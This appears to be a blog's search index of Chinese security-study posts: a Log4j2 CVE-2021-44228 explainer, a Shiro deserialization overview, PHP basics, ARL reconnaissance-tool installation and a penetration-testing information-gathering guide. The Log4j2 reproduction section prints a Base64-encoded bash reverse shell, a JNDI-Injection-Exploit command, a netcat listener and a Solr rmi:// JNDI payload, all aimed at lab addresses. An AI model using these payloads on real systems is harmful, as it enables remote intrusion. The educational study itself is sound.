<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Log4j2漏洞</title>
      <link href="/2024/09/14/log4j2-lou-dong/"/>
      <url>/2024/09/14/log4j2-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Log4j2漏洞"><a href="#Log4j2漏洞" class="headerlink" title="Log4j2漏洞"></a>Log4j2漏洞</h1><p>Log4j2漏洞，特别是CVE-2021-44228，是一个严重的安全漏洞，它允许攻击者通过构造特定的输入，利用**<u>Java命名和目录接口（JNDI）执行远程代码</u>**。以下是对该漏洞的详细解析：</p><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache Log4j2是一个基于Java的日志记录工具，被广泛应用于业务系统开发中。它允许开发者将程序的输入输出信息进行日志记录，并可以控制日志信息输送的目的地，如控制台、文件、GUI组件等。然而，在2021年12月，Apache官方披露了Log4j2的一个远程代码执行（RCE）漏洞，编号为CVE-2021-44228。</p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><p>​该漏洞的根源在于Log4j2的<strong>递归解析</strong>功能。当Log4j2在处理日志消息时，<u><strong>如果消息中包含了<code>${</code>开头的字符串，它会被视为一个可替换的变量，并尝试通过JNDI等方式解析该变量的值</strong></u>。攻击者可以构造包含恶意JNDI查询的日志消息，从而触发JNDI注入，最终执行远程代码。</p><p>​在输出日志信息时允许开发人员<strong>通过相应的协议去请求远程主机上的资源</strong>。 而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">${data:MM-dd-yyyy}</span><br><span class="line">${java:version}</span><br></pre></td></tr></tbody></table></figure><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>​开发人员一般会使用log4j2在日志中输出一些变量，log4j2 除了可以输出程序中的变量，它还提供了多种lookup功能插件，可以用来查找更多数据用于输出。lookup在log4j2中，就是允许在输出日志的时候，通过多种方式去查找要输出的内容，其中就可以使用Jndi Lookup。</p><p>​<strong>JNDl</strong> (Java Naming and Directory Interface，JAVA命名和目录接口)它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中<strong>可以使用名称来访问对象</strong>。JNDI下面有很多目录接口，用于不同的数据源的查找引用。</p><h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><p>​<strong>轻型目录访问协议</strong>:是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。</p><h4 id="RMI"><a href="#RMI" class="headerlink" title="RMI:"></a>RMI:</h4><p>远程方法调用:它是一种机制，能够让在<u><strong>某个java虚拟机上的对象调用另一个Java虚拟机的对象的方法</strong></u>。</p><h4 id="触发过程"><a href="#触发过程" class="headerlink" title="触发过程"></a>触发过程</h4><p><img src="https://pic.imgdb.cn/item/66e4e32dd9c307b7e96d850d.png"></p><h3 id="三、漏洞影响范围"><a href="#三、漏洞影响范围" class="headerlink" title="三、漏洞影响范围"></a>三、漏洞影响范围</h3><p>该漏洞影响Apache Log4j 2.0至2.14.1版本。一旦应用程序使用了这些版本的Log4j2，并且允许用户输入日志消息或控制日志消息的生成，就可能受到攻击。</p><h3 id="四、漏洞利用方式"><a href="#四、漏洞利用方式" class="headerlink" title="四、漏洞利用方式"></a>四、漏洞利用方式</h3><p>攻击者可以通过多种方式利用该漏洞，包括但不限于：</p><ul><li>构造包含恶意JNDI查询的HTTP请求，发送给使用Log4j2记录HTTP请求日志的应用程序。</li><li>在应用程序的输入字段中注入恶意JNDI查询，这些输入字段的值会被记录到日志中。</li><li>通过其他方式触发Log4j2记录包含恶意JNDI查询的日志消息。</li></ul><h3 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h3><p>为了防御该漏洞，可以采取以下措施：</p><ul><li><strong>升级到安全版本</strong>：将Log4j2升级到2.15.0或更高版本，这些版本已经修复了漏洞。</li><li><strong>禁用JNDI功能</strong>：如果不需要JNDI功能，可以在Log4j2的配置中禁用它。</li><li><strong>限制日志消息的输入</strong>：对应用程序中所有可能记录到日志的输入进行严格的验证和清理，防止恶意输入。</li><li><strong>监控和检测</strong>：监控应用程序的日志文件和系统日志，以检测可能的JNDI注入攻击。</li><li><strong>网络隔离</strong>：限制应用程序的外部网络访问，特别是对那些可能用于JNDI查询的端口和协议。</li></ul><h3 id="六、漏洞复现"><a href="#六、漏洞复现" class="headerlink" title="六、漏洞复现"></a>六、漏洞复现</h3><h4 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h4><ol><li>准备反弹shell，并将此命令进行Base64编码</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.113/123 0&gt;&amp;1</span><br><span class="line">Base64编码:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTEzLzEyMyAwPiYx</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>使用JNDIExploit进行漏洞利用，将上述Base64编码结果 填入指定位置</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHoT-all.jar -c "bash -c</span><br><span class="line">{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTEzLzEyMyAwPiYx}|</span><br><span class="line">{base64,-d}|{bash,-i}" -A "192.168.0.113"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66e4e808d9c307b7e970b8b8.png"></p><ol start="3"><li>在攻击机开启监听</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 123</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>修改payload</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.72.128:8983/solr/admin/cores?</span><br><span class="line">action=${ :rmi://192.168.0.113:1099/t9c5yy}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66e4e842d9c307b7e970e11e.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro漏洞</title>
      <link href="/2024/09/13/shiro-lou-dong/"/>
      <url>/2024/09/13/shiro-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro漏洞"><a href="#Shiro漏洞" class="headerlink" title="Shiro漏洞"></a>Shiro漏洞</h1><p>Shiro漏洞主要指的是Apache Shiro框架中存在的安全漏洞，这些漏洞可能被攻击者利用来执行恶意代码或获取敏感信息。Apache Shiro是一个功能强大且易于使用的Java安全框架，它提供了身份验证、授权、密码学和会话管理等功能，用于保护应用程序的安全。然而，由于框架设计或实现上的缺陷，Shiro在某些情况下会存在安全漏洞。</p><h3 id="Shiro漏洞的类型"><a href="#Shiro漏洞的类型" class="headerlink" title="Shiro漏洞的类型"></a>Shiro漏洞的类型</h3><p>Shiro漏洞的类型多种多样，但其中较为著名的是**<u>反序列化漏洞</u>**，特别是与“Remember Me”功能相关的漏洞。这些漏洞允许攻击者通过构造恶意的序列化数据来触发反序列化操作，进而执行任意代码或获取系统权限。</p><h3 id="Shiro反序列化漏洞的示例"><a href="#Shiro反序列化漏洞的示例" class="headerlink" title="Shiro反序列化漏洞的示例"></a>Shiro反序列化漏洞的示例</h3><ol><li>Shiro-550（CVE-2016-4437）<ul><li><strong>漏洞原理</strong>：<u>Shiro框架在登录时，如果勾选了“Remember Me”的功能，关闭浏览器再次访问时便无需再次登录。此时，cookie中会增加一个rememberMe字段</u>，其value的值是经过序列化、AES加密和Base64编码后得到的结果。由于AES加密的密钥被硬编码在代码中，<u>攻击者可以通过构造恶意的序列化数据，使用相同的密钥进行AES解密和Java反序列化</u>，从而执行任意代码。</li><li><strong>影响范围</strong>：Apache Shiro &lt;= 1.2.4</li></ul></li><li>Shiro-721（CVE-2019-12422）<ul><li><strong>漏洞原理</strong>：与Shiro-550类似，但加密方式改为了<strong>AES-CBC</strong>加密，且密钥是系统随机生成的。然而，这种加密模式可以通过Padding Oracle Attack（填充攻击）来绕过。攻击者可以使用有效的RememberMe Cookie作为前缀，然后精心<u>构造恶意的</u><u>RememberMe Cookie来实施反序列化攻击</u>。</li><li><strong>影响范围</strong>：Apache Shiro的某些版本（具体版本信息需参考官方公告）</li></ul></li></ol><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>Shiro反序列化漏洞的危害主要包括远程代码执行（RCE）、获取系统权限、敏感信息泄露等。攻击者可以利用这些漏洞来执行恶意代码，控制受影响的系统，进而进行更严重的攻击行为。</p><h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><p>为了防止Shiro反序列化漏洞的攻击，可以采取以下防护措施：</p><ol><li><strong>升级Shiro版本</strong>：及时关注Apache Shiro的官方公告和更新信息，将Shiro框架升级到最新版本。</li><li><strong>密钥管理</strong>：避免将密钥硬编码在代码中，采用更安全的方式生成和管理密钥。</li><li><strong>输入验证和过滤</strong>：对用户输入的数据进行严格的验证和过滤，确保输入的数据符合预期的格式和类型。</li><li><strong>限制反序列化的类</strong>：在反序列化操作中，指定允许反序列化的类，防止恶意用户通过构造特定类型的对象来触发反序列化漏洞。</li><li><strong>安全审计和代码审查</strong>：定期进行安全审计和代码审查，检查是否存在其他潜在的安全风险和漏洞。</li></ol><p>综上所述，Shiro漏洞是Apache Shiro框架中存在的安全漏洞之一，主要包括反序列化漏洞等类型。为了防止这些漏洞的攻击，需要采取相应的防护措施来加强系统的安全性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习</title>
      <link href="/2024/09/12/php-xue-xi/"/>
      <url>/2024/09/12/php-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP学习"><a href="#PHP学习" class="headerlink" title="PHP学习"></a>PHP学习</h1><h2 id="1-PHP简述"><a href="#1-PHP简述" class="headerlink" title="1.PHP简述"></a>1.PHP简述</h2><ul><li>PHP：超文本预处理器</li><li>通用开源脚本语言</li></ul><p>php的使用：</p><ol><li>PHP 可以生成动态页面内容</li><li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li><li>PHP 可以收集表单数据</li><li>PHP 可以发送和接收 cookies</li><li>PHP 可以添加、删除、修改您的数据库中的数据</li><li>PHP 可以限制用户访问您的网站上的一些页面</li><li>PHP 可以加密数据</li></ol><h2 id="2-基本语法格式"><a href="#2-基本语法格式" class="headerlink" title="2.基本语法格式"></a>2.基本语法格式</h2><ul><li><p>PHP 脚本以 &lt;?php 开始，以 ?&gt; 结束</p></li><li><p>static的关键字的使用</p><ul><li><p>当一个函数完成时，它的所有变量通常都会被删除。</p></li><li><p>然而，有时候您希望某个局部变量不要被删除。</p></li><li><p>要做到这一点，请在您第一次声明变量时使用 static 关键字：</p></li></ul></li></ul> <figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$n</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$n</span>++;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"调用了一次"</span>.<span class="variable">$n</span>.<span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="title function_ invoke__">test</span>();<span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="3-数据类型、常量以及字符串"><a href="#3-数据类型、常量以及字符串" class="headerlink" title="3.数据类型、常量以及字符串"></a>3.数据类型、常量以及字符串</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="string">"A"</span>,<span class="string">"B"</span>,<span class="string">"C"</span>);<span class="comment">//数组类型</span></span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">array</span>(<span class="string">'x'</span>=&gt;<span class="number">1</span>,<span class="string">'b'</span>=&gt;<span class="string">'2'</span>);<span class="comment">//字典类型</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span></span>{<span class="comment">//php对象的声明</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>{ }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">obj</span>();<span class="comment">//对象实例化类型</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="comment">//Array([0]=&gt;1 [1]=&gt;1 [2]=&gt;xxx)//数组输出</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$g</span>);</span><br><span class="line"><span class="comment">//Array([x]=&gt;1 [b]=&gt;2)//字典输出</span></span><br></pre></td></tr></tbody></table></figure><ul><li>对象、数组、字典需要var_dump()或print_r()才能输出，其余可用echo</li></ul><p>常量:</p><p>设置常量，使用 define() 函数，函数语法如下：</p><p>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</p><p>　　该函数有三个参数:</p><p>name：必选参数，常量名称，即标志符。</p><p>value：必选参数，常量的值。</p><p>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">"CL"</span>, <span class="string">"这是一个全局常量"</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> CL; <span class="comment">// 默认false，变量名区分大小写</span></span><br><span class="line"><span class="keyword">echo</span> cl; <span class="comment">// true不区分大小写</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>预定义常量:</p><p>PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。</p><p>（1）__FILE__(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。</p><p>（2）__LINE__(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。</p><p>（3）PHP_VERSION：当前PHP预处理器的版本，如5.4.16。</p><p>（4）PHP_OS: PHP所在的操作系统的类型。如Linux。</p><p>（5）TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。</p><p>（6）DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_OS;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> DIRECTORY_SEPARATOR;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>整型：</p><p>$a = 120 //十进制</p><p>$a = 0b110 //二进制</p><p>$a = 0120   //八进制</p><p>$a = 0x120  //十六进制</p><p>// 使用echo输出时。默认输出为<strong>十进制</strong></p><p>decbin() // 十进制转二进制</p><p>decoct() // 十进制转八进制</p><p>dechex() // 十进制转十六进制</p><p>bindec() // 二进制转十进制0b二进制-&gt;echo-&gt;自动转整型</p><p>bin2hex() //二进制转十六进制  </p><p>字符串:</p><p>双引号：解析字符串中的变量</p><p>单引号：不解析变量，当成字符串输出</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="string">'xmh'</span>;</span><br><span class="line"><span class="comment">//双引号里面有变量会输出变量的值,变量两侧有空格</span></span><br><span class="line"><span class="variable">$str</span> =<span class="string">"这是 <span class="subst">$name</span> 的学习笔记"</span>;</span><br><span class="line"><span class="comment">//单引号如果里面有变量都作为一个字符串处理</span></span><br><span class="line"><span class="variable">$str1</span> =<span class="string">'这是 $name 的学习笔记'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>strlen：返回字符串长度</p><p>trim：去除两端空格</p><p>strpos（$str，‘字符串’）：查找字符串首次出现位置</p><p>substr（$str，1，10）：字符串截取</p><p>str_replace(‘1’,’0’,$a)：字符串替换</p><p>md5($a)：md5加密</p><p>$a[0]：通过下标取字符的值</p><p>遍历字符串：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++){</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="4-数组"><a href="#4-数组" class="headerlink" title="4.数组"></a>4.数组</h2><p>在 PHP 中，有三种类型的数组：</p><p><strong>数值数组</strong> - 带有数字 ID 键的数组</p><p><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</p><p><strong>多维数组</strong> - 包含一个或多个数组的数组</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数组的声明:</span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);<span class="comment">//简单的数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);<span class="comment">//count()返回数组的长度</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARL灯塔安装</title>
      <link href="/2024/09/12/arl-deng-ta-an-zhuang/"/>
      <url>/2024/09/12/arl-deng-ta-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="ARL灯塔安装"><a href="#ARL灯塔安装" class="headerlink" title="ARL灯塔安装"></a>ARL灯塔安装</h1><blockquote><p>整合一下网上的大家安装的过程，并分享一下我的疯狂报错史</p></blockquote><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> kali系统安装docker和部署vulhub服务：<a href="https://blog.csdn.net/wuqixiufen2/article/details/135964089">kali系统安装docker</a></p><p>ARL资产侦察灯塔系统安装和使用(含实用配置说明)：<a href="https://blog.csdn.net/wuqixiufen2/article/details/138444737">ARL资产侦察灯塔系统安装和使用-CSDN博客</a></p><p>ARL项目地址：<a href="https://github.com/Aabyss-Team/ARL?tab=readme-ov-file">Aabyss-Team/ARL: ARL官方仓库备份项目：ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 (github.com)</a></p><h2 id="开动"><a href="#开动" class="headerlink" title="开动"></a>开动</h2><p>第一种方法：docker安装ARL</p><p>第二种发法：源码安装ARL</p><ol><li>docker安装</li></ol><p>首先，我是准备用kalil来安装的，那么先安装docker</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#切换管理员权限</span><br><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">#升级数据数据包</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line"># 如果安装docker，先移除</span><br><span class="line">sudo apt purge --autoremove docker.io</span><br><span class="line"></span><br><span class="line"># 安装docker</span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"></span><br><span class="line"># docker启动</span><br><span class="line">systemctl start docker </span><br><span class="line"># 或</span><br><span class="line">service docker start </span><br><span class="line"></span><br><span class="line"># 查看docker版本，查看成功表示安装成功了</span><br><span class="line">docker version</span><br><span class="line"></span><br><span class="line"># 安装docker-compose</span><br><span class="line">apt-get install docker-compose  </span><br><span class="line"></span><br><span class="line"># 修改docker镜像源</span><br><span class="line"># 创建或打开daemon.json</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line"># 按I键进入编辑状态，退出按Esc，保存按【:wq!】，退出不保存按【:q!】。</span><br><span class="line"></span><br><span class="line"># daemon.json文件加入以下内容，如果已经存在文件，有配置就不需要再添加</span><br><span class="line">{</span><br><span class="line">    "registry-mirrors": ["http://mirrors.aliyun.com"]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"># 重启docker守护进程让修改⽣效</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line"># 查看docker的镜像信息</span><br><span class="line">docker info</span><br><span class="line"></span><br><span class="line"># 创建一个新目录</span><br><span class="line">mkdir docker_arl</span><br><span class="line"></span><br><span class="line"># 切换到目录docker_arl</span><br><span class="line">cd docker_arl</span><br><span class="line"></span><br><span class="line"># 下载镜像包</span><br><span class="line">wget https://github.com/TophantTechnology/ARL/releases/download/v2.6.2/docker.zip</span><br><span class="line"></span><br><span class="line"># 解压压缩包</span><br><span class="line">unzip docker.zip</span><br><span class="line"></span><br><span class="line"># 删除压缩包</span><br><span class="line">rm -rf docker.zip</span><br><span class="line"></span><br><span class="line"># 创建存储卷</span><br><span class="line">docker volume create arl_db</span><br><span class="line"></span><br><span class="line"># 启动服务，</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 查看所有正在运行容器</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"># 查询当前目录下的服务是否启动</span><br><span class="line">docker-compose ps</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/09/11/xin-xi-shou-ji/"/>
      <url>/2024/09/11/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>​信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的<strong>域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感/目录文件、开放端口和中间件信息</strong>等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p><h2 id="2-信息收集分类"><a href="#2-信息收集分类" class="headerlink" title="2.信息收集分类"></a>2.信息收集分类</h2><ol><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等） dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站，C段等</li><li>google hacking针对化搜索，word/电子表格/pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ol><h2 id="3-常见方法"><a href="#3-常见方法" class="headerlink" title="3.常见方法"></a>3.常见方法</h2><ol><li>whois查询</li></ol><p>​域名在注册的时候，需要填入个人或者企业信息，如果没有设置隐藏属性可以查询出来，通过备案号查询个人或者企业信息，也可以whois反查注册人、邮箱、电话、机构，反查更多得域名和需要得信息。</p><ol start="2"><li>收集子域名</li></ol><p>域名分为根域名和子域名</p><p>xxx.com 根域名，也叫顶级域名</p><p><a href="http://www.xxx.com子域名,也叫二级域名/">www.xxx.com子域名，也叫二级域名</a></p><p><a href="http://www.abc.xxx.com/">www.abc.xxx.com</a> 子域名，也叫三级域名 四级如此类推</p><ol start="3"><li>端口扫描</li></ol><p>服务器需要开放服务，就必须开启端口，常见的端口是TCP 和UDP两种类型 </p><p>范围 0-65535 通过扫得到的端口，访问服务 规划下一步渗透。</p><ol start="4"><li>查找真实IP</li></ol><p>企业的网站，为了提高访问速度，或者避免黑客攻击，用了<strong>CDN</strong>服务，用了CDN之后真实服务器IP会被隐藏。</p><ol start="5"><li>探测旁站及C段</li></ol><p>旁站：一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>C段：查找同一个网段，服务器上的网站。可以找到同样网站的类型和服务器，也可以获取同段服务器进行下一步渗透。</p><p>C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器</p><ol start="6"><li>网络空间搜索引擎</li></ol><p>通过这些引擎查找网站或者服务器的信息，进行下一步渗透。</p><ol start="7"><li>扫描敏感目录/文件</li></ol><p>通过扫描目录和文件，大致了解网站的结构，获取突破点，比如后台，文件备份，上传点。</p><ol start="8"><li>指纹识别</li></ol><p>获取网站的版本，属于那些cms管理系统，查找漏洞exp，下载cms进行代码审计。</p><h2 id="4-在线whois查询"><a href="#4-在线whois查询" class="headerlink" 